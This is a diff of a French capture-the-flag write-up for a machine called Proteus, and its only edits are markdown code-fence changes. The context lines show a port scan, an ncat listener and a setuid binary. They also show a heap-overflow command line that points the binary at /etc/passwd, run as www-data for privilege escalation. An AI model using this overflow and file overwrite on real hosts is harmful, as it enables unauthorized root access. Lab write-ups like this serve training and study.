@@ -23,7 +23,7 @@ Oppenheimer
 
 On a les classiques ports 22 et 80 ainsi qu'un service inconnu et peu bavard :  
 
-```plain
+```
 Not shown: 65532 closed ports
 PORT     STATE SERVICE
 22/tcp   open  ssh
@@ -77,7 +77,7 @@ Pour faire propre j'ai utilisé le même javascript que pour [le CTF RedCross]({
 
 Ça finit par toquer à la porte :  
 
-```plain
+```
 Ncat: Version 7.01 ( https://nmap.org/ncat )
 Ncat: Listening on :::8000
 Ncat: Listening on 0.0.0.0:8000
@@ -148,13 +148,13 @@ Cela permet d'accéder à l'instance MySQL locale et d'obtenir le hash du passwo
 
 En revanche il y a un binaire avec des autorisations bien spécifiques (SETUIDDDDDDDDDD !)  
 
-```plain
+```
 -rwsr-xr-x 1 root root 7824 May 10  2017 /home/malwareadm/sites/proteus_site/admin_login_logger
 ```
 
 Quand on lance cet exécutable on a le message suivant :  
 
-```plain
+```
 $ ./admin_login_logger
 Usage: ./admin_login_logger  ADMIN LOGIN ATTEMPT (This will be done with phantomjs)
 ```
@@ -173,7 +173,7 @@ Et ce path est justement ouvert en écriture pour y placer l'UID utilisateur au 
 
 Ce path est normalement */var/log/proteus/log* mais du coup on peut le contrôler :  
 
-```plain
+```
 ./admin_login_logger `python3 -c 'print("A"*450 + "/"*10 + "/tmp//yolo.txt")'`
 Writing datafile 0x81501d0: '/////tmp//yolo.txt'
 *** Error in `./admin_login_logger': free(): invalid next size (normal): 0x08150008 ***
@@ -227,7 +227,7 @@ print(payload)
 
 Et finalement :  
 
-```plain
+```
 www-data@Proteus:/home/malwareadm/sites/proteus_site$ ./admin_login_logger `python3 /tmp/exploit.py`
 Writing datafile 0x954e1d0: '/etc/passwd'
 *** Error in `./admin_login_logger': double free or corruption (!prev): 0x0954e008 ***
